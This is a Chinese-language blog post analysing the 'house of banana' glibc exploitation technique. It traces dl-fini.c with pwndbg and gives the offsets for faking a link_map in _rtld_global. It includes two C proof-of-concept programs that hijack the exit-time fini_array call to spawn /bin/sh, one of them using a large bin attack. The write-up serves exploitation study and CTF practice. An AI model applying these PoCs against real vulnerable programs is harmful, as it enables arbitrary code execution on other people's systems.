---
title: house_of_banana源码分析
date: 2021-10-04 23:46:07
tags:
---

## House of banana
> 相较之与 house of orange，house of banana把攻击的焦点转向了ld。其更多地运用于条件极端的情况，如只能申请比较大的块，避开tcache，这时就可以运用这种机制


程序在执行完，或者直接执行exit();时，会进行些资源回收之类的活动，这次要攻击的就是这部分地fini-array，可以[这里](https://www.freebuf.com/articles/system/226003.html)了解下它的基本知识。

以下的源码来源于[glibc2.23](https://github.com/Giles-one/some-source-code/blob/master/2.23-0ubuntu11.3/elf/dl-fini.c)

### fini-arry中的函数是怎么执行的

首先导入源码进行调试
```Powershell
giles@ubuntu:~/Desktop/house_of_banana $ echo $ELF
/home/giles/real_source/glibc-2.23/elf
giles@ubuntu:~/Desktop/house_of_banana $ gdb a.out -d $ELF
```
接着查看，fini_array的函数，打上断点
```Powershell
pwndbg> elfheader 
0x400238 - 0x400254  .interp
0x400254 - 0x400274  .note.ABI-tag
0x400274 - 0x400298  .note.gnu.build-id
0x400298 - 0x4002b4  .gnu.hash
0x4002b8 - 0x400408  .dynsym
0x400408 - 0x4004b3  .dynstr
0x4004b4 - 0x4004d0  .gnu.version
0x4004d0 - 0x400510  .gnu.version_r
0x400510 - 0x400528  .rela.dyn
0x400528 - 0x400648  .rela.plt
0x400648 - 0x400662  .init
0x400670 - 0x400740  .plt
0x400740 - 0x400748  .plt.got
0x400750 - 0x4009f2  .text
0x4009f4 - 0x4009fd  .fini
0x400a00 - 0x400a29  .rodata
0x400a2c - 0x400a70  .eh_frame_hdr
0x400a70 - 0x400ba4  .eh_frame
0x600e10 - 0x600e18  .init_array
0x600e18 - 0x600e20  .fini_array
0x600e20 - 0x600e28  .jcr
0x600e28 - 0x600ff8  .dynamic
0x600ff8 - 0x601000  .got
0x601000 - 0x601078  .got.plt
0x601078 - 0x601088  .data
0x601088 - 0x601090  .bss
pwndbg> telescope 0x600e18
telescope: The program is not being run.
pwndbg> b main
Breakpoint 1 at 0x400944: file test.c, line 32.
pwndbg> r
pwndbg> telescope 0x600e18
00:0000│   0x600e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x400800 (__do_global_dtors_aux) ◂— cmp    byte ptr [rip + 0x200881], 0
01:0008│   0x600e20 (__JCR_LIST__) ◂— 0x0
02:0010│   0x600e28 (_DYNAMIC) ◂— 0x1
... ↓
04:0020│   0x600e38 (_DYNAMIC+16) ◂— 0xc /* '\x0c' */
05:0028│   0x600e40 (_DYNAMIC+24) —▸ 0x400648 (_init) ◂— sub    rsp, 8
06:0030│   0x600e48 (_DYNAMIC+32) ◂— 0xd /* '\r' */
07:0038│   0x600e50 (_DYNAMIC+40) —▸ 0x4009f4 (_fini) ◂— sub    rsp, 8
pwndbg> b *0x400800
Breakpoint 2 at 0x400800
```
程序中断之后，通过栈回溯，查看在哪部分调用了fini_array中的函数。
![](https://files.catbox.moe/3sl9u5.png)
在`/elf/dl-fini.c:235`行调用了fini_array中函数

### 源码分析

接着进行源码分析
```c
    if (l->l_info[DT_FINI_ARRAY] != NULL)
{
    ElfW(Addr) *array =
    (ElfW(Addr) *) (l->l_addr
            + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
    unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
            / sizeof (ElfW(Addr)));
    while (i-- > 0)
    ((fini_t) array[i]) ();
}
```
接着追溯array从而来

[`((fini_t) array[i]) ();`](https://github.com/Giles-one/some-source-code/blob/master/2.23-0ubuntu11.3/elf/dl-fini.c#L235)

[`array = (l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);`](https://github.com/Giles-one/some-source-code/blob/master/2.23-0ubuntu11.3/elf/dl-fini.c#L229)，

[`struct link_map *l = maps[i];`](https://github.com/Giles-one/some-source-code/blob/master/2.23-0ubuntu11.3/elf/dl-fini.c#L208)，

[maps的赋值](https://github.com/Giles-one/some-source-code/blob/master/2.23-0ubuntu11.3/elf/dl-fini.c#L173)
```c
define GL(name) _rtld_global._##name

for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
/* Do not handle ld.so in secondary namespaces.  */
if (l == l->l_real)
    {
assert (i < nloaded);

maps[i] = l;
l->l_idx = i;
++i;

/* Bump l_direct_opencount of all objects so that they
    are not dlclose()ed from underneath us.  */
++l->l_direct_opencount;
    }
```

`maps`的元素是从`l`来，通过那个宏，说明`l`是从全局变量`_rtld_global._dl_ns[0]._ns_loaded`而来

```Powershell
pwndbg> p _rtld_global._dl_ns[0]
$2 = {
  _ns_loaded = 0x7ffff7ffe168, 
  _ns_nloaded = 4, 
  _ns_main_searchlist = 0x7ffff7ffe420, 
  _ns_global_scope_alloc = 0, 
  _ns_unique_sym_table = {
    lock = {
      mutex = {
        __data = {
          __lock = 0, 
          __count = 0, 
          __owner = 0, 
          __nusers = 0, 
          __kind = 1, 
          __spins = 0, 
          __elision = 0, 
          __list = {
            __prev = 0x0, 
            __next = 0x0
          }
        }, 
        __size = '\000' <repeats 16 times>, "\001", '\000' <repeats 22 times>, 
        __align = 0
      }
    }, 
    entries = 0x0, 
    size = 0, 
    n_elements = 0, 
    free = 0x0
  }, 
  _ns_debug = {
    r_version = 0, 
    r_map = 0x0, 
    r_brk = 0, 
    r_state = RT_CONSISTENT, 
    r_ldbase = 0
  }
}
```
由for循环的`l = l->l_next`，说明其是个链表，只要把这个链表的指针覆盖，就可控制maps的元素，继而控制执行fini_array的执行。

> 在此插一句，house of banana 是由星盟的小海师傅发现投稿到安全客的，这里是[链接](https://www.anquanke.com/post/id/222948)，经过研究小海师傅控制的是`_ns_loaded`这个指针，也就是链表的第一个结点。但是破坏第一个节点之后要伪造链表的后三个节点才能绕过后来的检查和断言。而我采用的是劫持第三个节点的next指针，这样破环更小，绕过后来的检查更简单。

### 开始劫持


```c
for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
	    /* Do not handle ld.so in secondary namespaces.  */
// -------------------check0--------------------------------
    if (l == l->l_real)
// -------------------check0--------------------------------
    {
    assert (i < nloaded);

    maps[i] = l;
    l->l_idx = i;
    ++i;

    /* Bump l_direct_opencount of all objects so that they
        are not dlclose()ed from underneath us.  */
    ++l->l_direct_opencount;
    }
assert (ns != LM_ID_BASE || i == nloaded);
assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
```

动态调试时发现maps必须要有四个元素，所以我劫持的是第三个节点的next指针这样不会破环长度从而绕过下面的两个断言。

```powershell
pwndbg> distance &_rtld_global &(_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next)
0x7ffff7ffd040->0x7ffff7fdc018 is -0x21028 bytes (-0x4205 words)
```
劫持时只需在`_rtld_global-0x21028`处写入fake就行，这时可以参考large bin attack试试

另外为了能写入maps `maps[i] = l;`，需要绕过 check0，所以`fake+0x28`处要写入fake自己的地址


向下

```c
#define	DT_FINI_ARRAY	26		/* Array with addresses of fini fct */
#define	DT_FINI_ARRAYSZ	28		/* Size in bytes of DT_FINI_ARRAY */

  for (i = 0; i < nmaps; ++i)
	{
	    struct link_map *l = maps[i];
// -------------------check1--------------------------------
	    if (l->l_init_called)
// -------------------check1--------------------------------
		{
		  /* Make sure nothing happens if we are called twice.  */
		  l->l_init_called = 0;

		  /* Is there a destructor function?  */
// -------------------check2--------------------------------
		  if (l->l_info[26] != NULL
		      || l->l_info[DT_FINI] != NULL)
// -------------------check2--------------------------------
		    {
                ....

// -------------------check3--------------------------------
		        if (l->l_info[26] != NULL)
// -------------------check3--------------------------------
                {
                    array = (l->l_addr + l->l_info[26]->d_un.d_ptr);
                    
                    i = (l->l_info[28]->d_un.d_val / 8));
                    
                    while (i-- > 0)
                        ((fini_t) array[i]) ();
                }
                ...
		    }
        }
    }
```

对于check1，是个枚举体中成员 l_init_called，由于各版本有所差异，所以还是现查现用

```powershell
pwndbg> distance _rtld_global._dl_ns[0]._ns_loaded  &(_rtld_global._dl_ns[0]._ns_loaded)->l_init_called 
0x7ffff7ffd040->0x7ffff7ffe47c is 0x314 bytes (0x287 words)
pwndbg> x/wx &(_rtld_global._dl_ns[0]._ns_loaded)->l_init_called 
0x7ffff7ffe47c:	0x0000001c
```
所以 fake+0x143 = 0x1c ，便可绕过

对于check2，check3只需`l->l_info[DT_FINI_ARRAY] != NULL` 便可绕过
```c
pwndbg> distance  (_rtld_global._dl_ns[0]._ns_loaded)  &((_rtld_global._dl_ns[0]._ns_loaded)->l_info[26])
0x7ffff7ffe168->0x7ffff7ffe278 is 0x110 bytes (0x22 words)
```
在fake+0x110 写入的内容会直接控制array

```powershell
pwndbg> distance  (_rtld_global._dl_ns[0]._ns_loaded)  &((_rtld_global._dl_ns[0]._ns_loaded)->l_info[28])
0x7ffff7ffe168->0x7ffff7ffe288 is 0x120 bytes (0x24 words)
```
在fake+0x120写入的内容会控制`i`

只要把` fake+0x120，fake+0x110 ` 控制好就可以控制最后的`((fini_t) array[i]) ();`

这是正常执行fini_array的流程，所以我们照着此进行伪造。
```Powershell
pwndbg> p/x  *((_rtld_global._dl_ns[0]._ns_loaded)->l_info[26]) 
$16 = {
  d_tag = 0x1a, 
  d_un = {
    d_val = 0x600e18, 
    d_ptr = 0x600e18
  }
}
pwndbg> p/x  ((_rtld_global._dl_ns[0]._ns_loaded)->l_info[26])->d_un.d_ptr
$18 = 0x600e18
pwndbg> telescope 0x600e18
00:0000│   0x600e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x400840 (__do_global_dtors_aux) ◂— cmp    byte ptr [rip + 0x200849], 0
01:0008│   0x600e20 (__JCR_LIST__) ◂— 0x0
02:0010│   0x600e28 (_DYNAMIC) ◂— 0x1
... ↓
04:0020│   0x600e38 (_DYNAMIC+16) ◂— 0xc /* '\x0c' */
05:0028│   0x600e40 (_DYNAMIC+24) —▸ 0x400680 (_init) ◂— sub    rsp, 8
06:0030│   0x600e48 (_DYNAMIC+32) ◂— 0xd /* '\r' */
07:0038│   0x600e50 (_DYNAMIC+40) —▸ 0x400b14 (_fini) ◂— sub    rsp, 8
pwndbg> p/x  *((_rtld_global._dl_ns[0]._ns_loaded)->l_info[28]) 
$19 = {
  d_tag = 0x1c, 
  d_un = {
    d_val = 0x8, 
    d_ptr = 0x8
  }
}
```
所以

需要在`fake+0x110`写入一个ptr，且ptr+0x8处有ptr2，ptr2处写入的是最后要执行的函数地址.

需要在`fake+0x120`写入一个ptr，且ptr+0x8处是`i*8`。

我选择的是`fake+0x110`写入`fake+0x40`，在`fake+0x48`写入`fake+0x58`，在`fake+0x58`写入shell

我选择在`fake+0x120`写入`fake+0x48`，在`fake+0x50`处写入8。


综上所述
* 劫持
  *  `&(_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next) = fake`
* check0
  *  `fake+0x28 = fake` 
* check1
  *  `fake+0x314 = 0x1c` 
* 控制array
  *  `fake+0x110 = fake+0x40` 
  *  `fake+0x48 = fake+0x58`
  *  `fake+0x58 = shell`
* 控制i
  *  `fake+0x120 = fake+0x48` 
  *  `fake+0x50 = 8` 

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
void shell()
{
	system("/bin/sh");
}
uint64_t getLibcBase()
{
	uint64_t to;
	uint64_t from;
	char buf[0x400];
	
	FILE* file;
	sprintf(buf, "/proc/%d/maps",(int)getpid()); 
	file = fopen(buf, "r");
	while(fgets(buf, sizeof(buf), file)) 
	{
		if(strstr(buf,"libc")!=NULL)
		{
		    sscanf(buf, "%lx-%lx", &from, &to);
		    fclose(file);
			return from;
		}
	}
}
int main()
{
	uint64_t libcBase    = getLibcBase();
	uint64_t rtld_global = libcBase+0x5f0040;
	uint64_t* next_node = (uint64_t*)(rtld_global-0x21028);	 // distance &_rtld_global &(_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next)
	uint64_t fake = (uint64_t)malloc(0x470);
	memset((void*)fake,0,0x470);
	
	*next_node = fake;
	*(uint64_t*)(fake+0x28)  = fake;

	*(uint64_t*)(fake+0x314) = 0x1c;
	
    *(uint64_t*)(fake+0x110) = fake+0x40;
	*(uint64_t*)(fake+0x48)  = fake+0x58;
	*(uint64_t*)(fake+0x58)  = (uint64_t)shell;

	*(uint64_t*)(fake+0x120) = fake+0x48;
	*(uint64_t*)(fake+0x50)  = 0x8;
	return 0;

}

```
poc中没有结合large bin attack，是因为各版本中large bin attack有所不同，反正最后写入的都是个堆地址。
另外说下，在glibc 2.31中`*(uint64_t*)(fake+0x314) = 0x1c;`变成了`*(uint64_t*)(fake+0x31c) = 0x1c;`

### 另外
1. 最终执行的是，`array[i]) ()`其在一个while循环中，所以只要把i构造恰当，那么就可完成些不太严谨的ROP。

这里有个不严谨的poc在2.31-0ubuntu9.2下测试的，包含了large bin attack的过程。
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>


void shell()
{
   system("/bin/sh");
}

uint64_t getLibcBase()
{
   uint64_t to;
   uint64_t from;
   char buf[0x400];
   
   FILE* file;
   sprintf(buf, "/proc/%d/maps",(int)getpid()); 
   file = fopen(buf, "r");
   while(fgets(buf, sizeof(buf), file)) 
   {
      if(strstr(buf,"libc")!=NULL)
      {
          sscanf(buf, "%lx-%lx", &from, &to);
          fclose(file);
          return from;
      }
   }
}

int main(){
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  uint64_t libcBase    = getLibcBase();
  uint64_t rtld_global = libcBase+0x23b060;
  uint64_t* next_node = (uint64_t*)(rtld_global-0x49048);   // distance &_rtld_global &(_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next)

  uint64_t *p1 = malloc(0x428);
  uint64_t *g1 = malloc(0x18);

  uint64_t *p2 = malloc(0x418);
  uint64_t *g2 = malloc(0x18);
  uint64_t fake = (uint64_t)p2-0x10;

 *(uint64_t*)(fake+0x28)  = fake;
 *(uint64_t*)(fake+0x31c) = 0x1c;
 *(uint64_t*)(fake+0x110) = fake+0x40;
 *(uint64_t*)(fake+0x48)  = fake+0x58;
 *(uint64_t*)(fake+0x58)  = (uint64_t)shell;
 *(uint64_t*)(fake+0x120) = fake+0x48;
 *(uint64_t*)(fake+0x50)  = 0x8;

  free(p1);
  uint64_t *g3 = malloc(0x438);         //force p1 insert in to the largebin
  free(p2);
  p1[3] = ((uint64_t)next_node -0x20); //push p2 into unsoteded bin
  uint64_t *g4 = malloc(0x438);        //force p2 insert in to the largebin
  
  p2[1] = 0;
  p2[3] = fake;
 
  return 0;
}
```

2. 最先在研究时发现直接劫持`(_rtld_global._dl_ns[0]._ns_loaded)->l_info[26]`的指针更方便，我想的是与large bin attack结合，但是large bin attack之后本应该写入shell的地方落在了size域上是不可控的。如果题目中漏洞比较特殊，可以控制size域，那么整个banana的过程无需做任何绕过，劫持程序流就更为简单。



